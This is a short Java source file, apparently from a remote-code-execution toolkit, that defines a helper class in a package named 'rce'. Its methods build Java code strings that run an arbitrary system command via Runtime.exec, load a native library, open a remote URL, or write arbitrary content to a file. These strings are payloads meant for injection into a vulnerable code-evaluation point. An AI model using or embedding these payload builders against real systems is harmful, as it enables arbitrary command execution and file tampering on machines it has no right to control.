package rce;

public class PayloadHelpler {
    public static String getRuntimePayload(String cmd){
        return "java.lang.Runtime.getRuntime().exec(\""+cmd+"\");";
    }

    public static String getSystemloadPayload(String path){
        return "java.lang.System.load(\""+path+"\");";
    }

    public static String getURLopenStreamPayload(String url){
        return "new java.net.URL(\""+url+"\").openStream();";
    }

    public static String getFileOutputStreamPayload(String path, String content){
        return "java.io.FileOutputStream fos = new java.io.FileOutputStream(\""+path+"\");\n" +
                "fos.write(\""+content+"\".getBytes());\n" +
                "fos.close();";
    }
}
